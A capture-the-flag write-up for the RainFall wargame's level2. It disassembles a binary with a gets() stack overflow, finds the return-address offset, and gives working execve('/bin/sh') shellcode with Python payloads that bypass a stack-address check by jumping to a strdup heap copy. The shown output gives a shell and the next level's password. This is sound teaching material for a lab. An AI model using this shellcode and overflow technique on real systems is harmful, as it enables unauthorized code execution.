# Source Code
### in Assembly with help gdb
```
(gdb) disassemble main
Dump of assembler code for function main:
   0x0804853f <+0>:     push   %ebp
   0x08048540 <+1>:     mov    %esp,%ebp
   0x08048542 <+3>:     and    $0xfffffff0,%esp
   0x08048545 <+6>:     call   0x80484d4 <p>
   0x0804854a <+11>:    leave
   0x0804854b <+12>:    ret
End of assembler dump.

(gdb) disassemble p
Dump of assembler code for function p:
   0x080484d4 <+0>:     push   %ebp
   0x080484d5 <+1>:     mov    %esp,%ebp
   0x080484d7 <+3>:     sub    $0x68,%esp
   0x080484da <+6>:     mov    0x8049860,%eax
   0x080484df <+11>:    mov    %eax,(%esp)
   0x080484e2 <+14>:    call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax
   0x080484ea <+22>:    mov    %eax,(%esp)
   0x080484ed <+25>:    call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:    mov    0x4(%ebp),%eax
   0x080484f5 <+33>:    mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:    mov    -0xc(%ebp),%eax
   0x080484fb <+39>:    and    $0xb0000000,%eax
   0x08048500 <+44>:    cmp    $0xb0000000,%eax
   0x08048505 <+49>:    jne    0x8048527 <p+83>
   0x08048507 <+51>:    mov    $0x8048620,%eax
   0x0804850c <+56>:    mov    -0xc(%ebp),%edx
   0x0804850f <+59>:    mov    %edx,0x4(%esp)
   0x08048513 <+63>:    mov    %eax,(%esp)
   0x08048516 <+66>:    call   0x80483a0 <printf@plt>
   0x0804851b <+71>:    movl   $0x1,(%esp)
   0x08048522 <+78>:    call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:    lea    -0x4c(%ebp),%eax
   0x0804852a <+86>:    mov    %eax,(%esp)
   0x0804852d <+89>:    call   0x80483f0 <puts@plt>
   0x08048532 <+94>:    lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:    mov    %eax,(%esp)
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:   leave
   0x0804853e <+106>:   ret
```

### in c

```c
char *p()
{
  char  buffer[64];
  void  *retaddr;

  gets(buffer);
  if ( (retaddr & 0xb0000000) == 0xb0000000 )
  {
    printf("(%p)\n", retaddr);
    exit(1);
  }
  puts(buffer);
  return strdup(buffer);
}


int main()
{
  p();
}
```

# Exploring
like the level before, we have stack buffer overflow due `gets` function that write to a stack allocated variable `buffer[64]`.

Find the offset, use `cyclic,py` on `tools` dir.

generate buffer for input to gets.
```
python3 tools/cyclic.py -g 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```


We gets overriten EIP

```gdb
(gdb) x/wx $ebp+0x4
0xbffff70c:     0x37634136  <- new EIP value
```

Calc Offset.
```
python3 tools/cyclic.py -o 0x37634136
Offset found at: 80 <- the offset
```

The offset is 80.
Now we can override the **EIP** for jumping to ..., to ..., Wait we dont have a function in code that can we use them to gain access to a shell `/bin/sh`.

What about injecting a shellcode in the buffer.


***
**Shellcode**

Shellcode is a small piece of assembly code used in binary exploits to perform tasks like opening a shell or executing commands.
In a typical exploit, an attacker crafts this shellcode to take control of a vulnerable application by inserting it into memory and redirecting the execution flow to it.
To create shellcode, developers write the desired instructions in assembly language and then assemble them into machine code—a sequence of bytes the processor can execute.
Special attention is given to avoiding null bytes or other characters that might terminate the string prematurely, ensuring that the shellcode runs correctly once injected.

***

Example of one that execute `execve("/bin/sh")`.

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80
```
for more shellcodes visit https://shell-storm.org/shellcode/index.html

# Exploit

put the shellcode to buffer and append padding to reach 80, then override **EIP** with buffer variable address.

`buffer` address is `0xbffff6bc`

the payload in python

```python2
shell = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'

# 0xbffff6bc
buff_addr = '\xbc\xf6\xff\xbf' # due little-endian system

right_padding_len = 10

padding_len = 80 - len(shell) - right_padding_len

buff = '\x90' * right_padding_len + shell + '\x90' * padding_len + buff_addr

print buff,

```

the if condition on the code catch us,

```
level2@RainFall:~$ (python2 payload.py; cat) | ./level2
(0xbffff6bc)
```

because address of buffer start with 0xb........, to bypass this check we'll use heap address `strdup(buffer)`.
the address of buffer on heap is `0x0804a008`, isn't start with 0xb........ .
so, the modified payload is:
```python2
shell = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'

# 0x0804a008
buff_addr = '\x08\xa0\x04\x08' # due little-endian system

right_padding_len = 10

padding_len = 80 - len(shell) - right_padding_len

buff = '\x90' * right_padding_len + shell + '\x90' * padding_len + buff_addr

print buff,
```

And Here we go,
```
level2@RainFall:~$ (python2 payload.py; cat) | ./level2
1Ph//shh/binPS1Ұ
                ̀
whoami
level3
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

